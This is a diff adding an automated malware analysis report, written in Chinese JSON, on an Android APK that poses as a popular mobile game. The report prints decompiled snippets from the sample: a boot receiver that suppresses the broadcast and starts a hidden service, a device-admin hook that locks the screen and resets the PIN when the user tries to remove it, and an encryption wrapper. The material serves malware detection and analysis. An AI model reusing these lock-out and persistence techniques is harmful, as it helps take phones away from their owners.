@@ -1,0 +1,153 @@
+{
+  "APK信息": {
+    "文件名": "e6be2b3c3e89a314c4247ebfbf56b511ac38aba4acda7e300cdc50e6342c465d.apk",
+    "sha256": "e6be2b3c3e89a314c4247ebfbf56b511ac38aba4acda7e300cdc50e6342c465d",
+    "包名": "com.xcgdmmsj",
+    "应用名": "和平精英",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 271.8
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\xcgdmmsj\\bbb;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (intent.getAction().equals(\"android.intent.action.BOOT_COMPLETED\")) {\n    abortBroadcast();\n    Intent intent2 = new Intent(context, Class.forName(\"com.xcgdmmsj.s\"));\n    intent2.addFlags(268435456);\n    context.startService(intent2);\n}",
+          "malicious_code_snippet_context": "  public class bbb extends BroadcastReceiver {\n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equals(\"android.intent.action.BOOT_COMPLETED\")) {\n>>>             abortBroadcast();\n>>>             try {\n>>>                 Intent intent2 = new Intent(context, Class.forName(\"com.xcgdmmsj.s\"));\n>>>                 intent2.addFlags(268435456);\n>>>                 context.startService(intent2);\n              } catch (ClassNotFoundException e) {\n                  throw new NoClassDefFoundError(e.getMessage());\n              }",
+          "behavior_description": "该类是一个BroadcastReceiver，监听系统开机完成广播BOOT_COMPLETED（source）。收到广播后首先调用abortBroadcast()尝试终止广播继续传播以规避其他接收者感知，随后通过反射Class.forName(\"com.xcgdmmsj.s\")动态加载隐藏的服务类，并调用startService()在设备每次开机时自动拉起该服务（sink），实现恶意样本的持久化保活。数据流向：系统开机广播Intent.getAction() → abortBroadcast()隐蔽终止广播 + 反射加载并startService()启动隐藏服务com.xcgdmmsj.s。需要说明的是，此代码片段本身并未直接调用SmsManager或操作短信内容，不属于直接的短信拦截实现，而是恶意样本的开机自启持久化组件，确保设备重启后其疑似短信欺诈/拦截服务持续运行；其中abortBroadcast()的调用模式与典型短信拦截器（在SMS_RECEIVED上终止广播以隐藏短信）高度相似，但此处作用于BOOT_COMPLETED，属于隐蔽保活手段而非短信拦截本体。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\xcgdmmsj\\MyAdmin;",
+          "method_signature": "onDisableRequested(Context context, Intent intent)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public class MyAdmin extends DeviceAdminReceiver {\n    @Override\n    public CharSequence onDisableRequested(Context context, Intent intent) {\n        String str = M.getsss(BAH.getString(context.getResources().openRawResource(R.raw.pin)).replaceAll(\"\\n\", \"\"));\n        getManager(context).lockNow();\n        getManager(context).resetPassword(str, 0);\n        return super.onDisableRequested(context, intent);\n    }\n}",
+          "malicious_code_snippet_context": "  import android.util.Log;\n  \n  /* JADX INFO: loaded from: classes.dex */\n>>> public class MyAdmin extends DeviceAdminReceiver {\n>>>     @Override // android.app.admin.DeviceAdminReceiver\n>>>     public CharSequence onDisableRequested(Context context, Intent intent) {\n>>>         String str = M.getsss(BAH.getString(context.getResources().openRawResource(R.raw.pin)).replaceAll(\"\\n\", \"\"));\n>>>         getManager(context).lockNow();\n>>>         getManager(context).resetPassword(str, 0);\n>>>         return super.onDisableRequested(context, intent);\n>>>     }\n>>> \n      @Override // android.app.admin.DeviceAdminReceiver\n      public void onEnabled(Context context, Intent intent) {\n          String str = M.getsss(BAH.getString(context.getResources().openRawResource(R.raw.pin)).replaceAll(\"\\n\", \"\"));",
+          "behavior_description": "该类继承 DeviceAdminReceiver 并重写 onDisableRequested 回调：当用户尝试取消设备管理员权限（即试图卸载/停用恶意软件）时触发。代码从 APK 内嵌的 raw 资源文件 R.raw.pin 读取加密内容，经 BAH.getString 解码和 M.getsss 解密得到攻击者预设的 PIN 码，随后立即调用 DevicePolicyManager.lockNow() 锁定屏幕，并调用 resetPassword() 将设备锁屏密码重置为该 PIN。数据流向为：内嵌加密资源 → 解密出勒索 PIN → 锁屏并重置密码。这导致用户被锁在设备之外且无法移除恶意管理员权限，是典型的勒索软件设备锁定（device-lock ransomware）行为，与 Android/Lockerpin 等家族手法一致。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\xcgdmmsj\\DU;",
+          "method_signature": "decrypt(byte[] bArr)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public byte[] decrypt(byte[] bArr) throws Exception {\n    return this.decryptCipher.doFinal(bArr);\n}\n\npublic byte[] encrypt(byte[] bArr) throws Exception {\n    return this.encryptCipher.doFinal(bArr);\n}",
+          "malicious_code_snippet_context": "          return new String(decrypt(hexStr2ByteArr(str)));\n      }\n  \n>>>     public byte[] decrypt(byte[] bArr) throws Exception {\n>>>         return this.decryptCipher.doFinal(bArr);\n>>>     }\n>>> \n>>>     public String encrypt(String str) throws Exception {\n>>>         return byteArr2HexStr(encrypt(str.getBytes()));\n>>>     }\n  \n      public byte[] encrypt(byte[] bArr) throws Exception {\n          return this.encryptCipher.doFinal(bArr);",
+          "behavior_description": "该类位于恶意软件自有包 com.xcgdmmsj 下（非知名第三方库），是自定义对称加解密引擎，封装了 javax.crypto.Cipher 的 doFinal 操作：encrypt() 对传入字节数组执行加密并转为十六进制字符串输出，decrypt() 则执行解密。在已确认的勒索软件样本中，该类是文件加密行为的核心组件：勒索程序遍历并读取用户文件内容→ 将文件数据作为 bArr 传入 encrypt(byte[]) → 由 encryptCipher.doFinal() 完成对称加密 → 密文（十六进制形式）写回覆盖原文件，使用户数据被劫持勒索；decrypt() 可能用于支付赎金后恢复数据或解密 C2 下发的配置/指令。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "banking_trojan",
+      "中文名": "银行木马",
+      "MITRE": "T1418",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "credential_phishing",
+          "中文名": "凭证钓鱼",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "password"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\xcgdmmsj\\MyAdmin;",
+          "method_signature": "onDisableRequested(Context context, Intent intent)",
+          "malicious_behavior": "banking_trojan",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String str = M.getsss(BAH.getString(context.getResources().openRawResource(R.raw.pin)).replaceAll(\"\\n\", \"\"));\ngetManager(context).lockNow();\ngetManager(context).resetPassword(str, 0);",
+          "malicious_code_snippet_context": "  public class MyAdmin extends DeviceAdminReceiver {\n      @Override // android.app.admin.DeviceAdminReceiver\n      public CharSequence onDisableRequested(Context context, Intent intent) {\n>>>         String str = M.getsss(BAH.getString(context.getResources().openRawResource(R.raw.pin)).replaceAll(\"\\n\", \"\"));\n>>>         getManager(context).lockNow();\n>>>         getManager(context).resetPassword(str, 0);\n          return super.onDisableRequested(context, intent);\n      }\n  ",
+          "behavior_description": "该类继承 DeviceAdminReceiver 并滥用设备管理器权限实现防卸载与锁屏勒索。当用户尝试停用设备管理器时（onDisableRequested 回调触发），代码从 APK 内置原始资源 R.raw.pin 中读取硬编码 PIN，经解密/解码后，先调用 lockNow() 立即锁定屏幕，再调用 resetPassword() 静默将设备锁屏密码重置为攻击者预设的 PIN，导致用户既无法解锁设备、也无法停用管理员权限进而无法卸载恶意应用；onEnabled 时还会启动隐藏服务 com.xcgdmmsj.s 实现持久化驻留。数据流向：APK 内置资源 R.raw.pin（source）→ DevicePolicyManager.resetPassword() + lockNow()（sink），是银行木马/勒索类样本典型的设备管理器滥用与自保护行为，直接造成用户设备被锁、无法正常使用。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
